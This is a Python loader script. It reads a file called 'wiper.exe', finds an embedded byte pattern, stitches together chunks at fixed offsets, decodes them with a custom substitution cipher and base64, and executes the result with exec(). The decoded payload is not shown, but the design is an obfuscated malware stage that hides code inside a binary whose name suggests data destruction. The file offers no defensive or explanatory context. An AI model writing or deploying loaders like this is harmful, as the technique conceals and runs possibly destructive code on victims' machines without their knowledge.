## -*- coding: utf-8 -*-
from base64 import b64decode

def toASCII(DKOTI):
	ASCII = ''

	for pos in range(len(DKOTI)):
		if DKOTI[pos] == ' ': ASCII += '0'
		elif DKOTI[pos] == '!': ASCII += '1'
		elif DKOTI[pos] == '\"': ASCII += '2'
		elif DKOTI[pos] == '#': ASCII += '3'
		elif DKOTI[pos] == '$': ASCII += '4'
		elif DKOTI[pos] == '%': ASCII += '5'
		elif DKOTI[pos] == '&': ASCII += '6'
		elif DKOTI[pos] == '\'': ASCII += '7'
		elif DKOTI[pos] == '(': ASCII += '8'
		elif DKOTI[pos] == ')': ASCII += '9'
		elif DKOTI[pos] == '@': ASCII += 'A'
		elif DKOTI[pos] == 'A': ASCII += 'B'
		elif DKOTI[pos] == 'B': ASCII += 'C'
		elif DKOTI[pos] == 'C': ASCII += 'D'
		elif DKOTI[pos] == 'D': ASCII += 'E'
		elif DKOTI[pos] == 'F': ASCII += 'F'
		elif DKOTI[pos] == 'G': ASCII += 'G'
		elif DKOTI[pos] == 'I': ASCII += 'H'
		elif DKOTI[pos] == 'J': ASCII += 'I'
		elif DKOTI[pos] == 'K': ASCII += 'J'
		elif DKOTI[pos] == 'L': ASCII += 'K'
		elif DKOTI[pos] == 'M': ASCII += 'L'
		elif DKOTI[pos] == 'N': ASCII += 'M'
		elif DKOTI[pos] == 'O': ASCII += 'N'
		elif DKOTI[pos] == 'P': ASCII += 'O'
		elif DKOTI[pos] == 'Q': ASCII += 'P'
		elif DKOTI[pos] == 'S': ASCII += 'Q'
		elif DKOTI[pos] == 'T': ASCII += 'R'
		elif DKOTI[pos] == 'U': ASCII += 'S'
		elif DKOTI[pos] == 'V': ASCII += 'T'
		elif DKOTI[pos] == 'W': ASCII += 'U'
		elif DKOTI[pos] == 'X': ASCII += 'V'
		elif DKOTI[pos] == 'Y': ASCII += 'W'
		elif DKOTI[pos] == 'Z': ASCII += 'X'
		elif DKOTI[pos] == '[': ASCII += 'Y'
		elif DKOTI[pos] == '\\': ASCII += 'Z'
		elif DKOTI[pos] == '`': ASCII += 'a'
		elif DKOTI[pos] == 'a': ASCII += 'b'
		elif DKOTI[pos] == 'b': ASCII += 'c'
		elif DKOTI[pos] == 'c': ASCII += 'd'
		elif DKOTI[pos] == 'd': ASCII += 'e'
		elif DKOTI[pos] == 'f': ASCII += 'f'
		elif DKOTI[pos] == 'g': ASCII += 'g'
		elif DKOTI[pos] == 'i': ASCII += 'h'
		elif DKOTI[pos] == 'j': ASCII += 'i'
		elif DKOTI[pos] == 'k': ASCII += 'j'
		elif DKOTI[pos] == 'l': ASCII += 'k'
		elif DKOTI[pos] == 'm': ASCII += 'l'
		elif DKOTI[pos] == 'n': ASCII += 'm'
		elif DKOTI[pos] == 'o': ASCII += 'n'
		elif DKOTI[pos] == 'p': ASCII += 'o'
		elif DKOTI[pos] == 'q': ASCII += 'p'
		elif DKOTI[pos] == 's': ASCII += 'q'
		elif DKOTI[pos] == 't': ASCII += 'r'
		elif DKOTI[pos] == 'u': ASCII += 's'
		elif DKOTI[pos] == 'v': ASCII += 't'
		elif DKOTI[pos] == 'w': ASCII += 'u'
		elif DKOTI[pos] == 'x': ASCII += 'v'
		elif DKOTI[pos] == 'y': ASCII += 'w'
		elif DKOTI[pos] == 'z': ASCII += 'x'
		elif DKOTI[pos] == '{': ASCII += 'y'
		elif DKOTI[pos] == '|': ASCII += 'z'
		elif DKOTI[pos] == '1': ASCII += '+'
		elif DKOTI[pos] == '3': ASCII += '/'
		elif DKOTI[pos] == '8': ASCII += '='
		elif DKOTI[pos] == '\n': ASCII += '\n'

	return ASCII

try:
	pattern = b'J{NgMUpvJGOx\\Gmw\\|pgcZTnMVggMUpvBoT{dVpLBYmvbG){cBA `Y!mBgmqaZAxboSgb#m|BgmqaZAxboSgcGi{\\YFl`Y%oBgmqaZAxboSg`Y(LBYmvbG){cBA{['
	code = b''

	binar = open('wiper.exe','rb')
	data = binar.read()
	binar.close

	pos = data.find(pattern)
	for row in range(14):
		code += data[pos:pos+3500]
		pos += 3504
	code += data[pos:pos+2712]

	code = code.decode('ascii')
	code = toASCII(code)
	code = b64decode(code)
	code = code.decode('utf-8')

	exec(code)

except Exception:
	print("arelive obosralsya")
	input()
